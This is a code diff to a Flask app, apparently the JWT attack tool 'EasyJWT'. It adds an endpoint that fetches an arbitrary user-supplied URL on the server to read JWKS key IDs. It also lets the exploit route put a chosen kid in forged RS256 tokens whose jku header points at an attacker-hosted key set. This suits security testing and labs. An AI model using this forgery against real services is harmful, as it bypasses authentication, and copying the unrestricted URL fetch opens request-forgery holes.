@@ -9,6 +9,8 @@ import os
 import subprocess
 import tempfile
 import time
+import urllib.error
+import urllib.request
 from functools import wraps
 
 from flask import Flask, jsonify, render_template, request, Response, send_from_directory
@@ -415,6 +417,50 @@ def forge():
     return jsonify({"token": token})
 
 
+@app.route("/api/fetch-jwks-kids", methods=["POST"])
+@auth_required
+@rate_limited
+def fetch_jwks_kids():
+    # Lets the Spoof JWKS panel read back whatever kid(s) are actually
+    # present at a URL the user is hosting themselves, instead of the
+    # header having to hardcode one and hope it matches. Fetches the URL
+    # server-side: a direct browser fetch would usually fail on these
+    # URLs anyway (no CORS headers to allow it), and server-side also
+    # means this works the same for a lab target the browser can't be
+    # trusted to reach reliably.
+    url = (request.json or {}).get("url", "").strip()
+    if not url:
+        return jsonify({"error": "A URL is required"}), 400
+    if not url.startswith(("http://", "https://")):
+        return jsonify({"error": "URL must start with http:// or https://"}), 400
+
+    try:
+        req = urllib.request.Request(url, headers={"User-Agent": "EasyJWT"})
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            raw = resp.read(1024 * 1024)  # 1 MB cap, a JWKS is never this big
+    except urllib.error.HTTPError as exc:
+        return jsonify({"error": f"Server responded with HTTP {exc.code}"}), 400
+    except urllib.error.URLError as exc:
+        return jsonify({"error": f"Could not reach that URL: {exc.reason}"}), 400
+    except Exception as exc:
+        return jsonify({"error": f"Could not fetch that URL: {exc}"}), 400
+
+    try:
+        body = json.loads(raw)
+    except Exception as exc:
+        return jsonify({"error": f"Response wasn't valid JSON: {exc}"}), 400
+
+    keys = body.get("keys") if isinstance(body, dict) else None
+    if not isinstance(keys, list):
+        return jsonify({"error": 'Response has no "keys" array, is this a JWKS?'}), 400
+
+    kids = [k.get("kid") for k in keys if isinstance(k, dict) and k.get("kid")]
+    if not kids:
+        return jsonify({"error": "No key in that JWKS has a kid"}), 400
+
+    return jsonify({"kids": kids})
+
+
 @app.route("/api/exploit", methods=["POST"])
 @auth_required
 @rate_limited
@@ -424,6 +470,7 @@ def exploit():
     code = data.get("code", "").strip()
     pubkey = data.get("pubkey", "")
     jwks_url = data.get("jwks_url", "").strip()
+    kid_override = data.get("kid", "").strip()
 
     if not token or not code:
         return jsonify({"error": "Token and exploit code are required"}), 400
@@ -462,9 +509,15 @@ def exploit():
 
         default_jwks_url = f"{SITE_URL}/jwks.json"
         target_jku = jwks_url or default_jwks_url
+        # kid still signs with the same fixed key either way, this only
+        # changes what the header CLAIMS its kid is. Matters when your
+        # own hosted JWKS copy ended up under a different kid than ours
+        # (fetched via /api/fetch-jwks-kids, or typed by hand) and the
+        # target looks up keys by kid: it needs to match what's actually
+        # hosted, not EasyJWT's own internal name for this key.
         header["alg"] = "RS256"
         header["jku"] = target_jku
-        header["kid"] = DEFAULT_JWKS_KID
+        header["kid"] = kid_override or DEFAULT_JWKS_KID
         if "typ" not in header:
             header["typ"] = None  # don't let PyJWT silently add one, see /api/forge
 
@@ -475,10 +528,12 @@ def exploit():
 
         if jwks_url:
             note = (
-                f"Signed with EasyJWT's built-in default key, jku set to the URL you gave: {target_jku}\n"
-                f"Make sure that URL actually serves a JWKS containing this exact key (visit "
-                f"{default_jwks_url} yourself and copy its \"keys\" entry into your JWKS body) "
-                "or the target won't be able to verify this signature."
+                f"Signed with EasyJWT's built-in default key, jku set to the URL you gave: {target_jku}, "
+                f"kid set to {header['kid']}.\n"
+                f"Make sure that URL actually serves a JWKS containing this exact key under that kid "
+                f"(visit {default_jwks_url} yourself and copy its \"keys\" entry into your JWKS body, "
+                "or use \"Fetch kid from URL\" above to read back whatever kid you actually hosted it "
+                "under) or the target won't find a matching key to verify this signature."
             )
         else:
             note = (
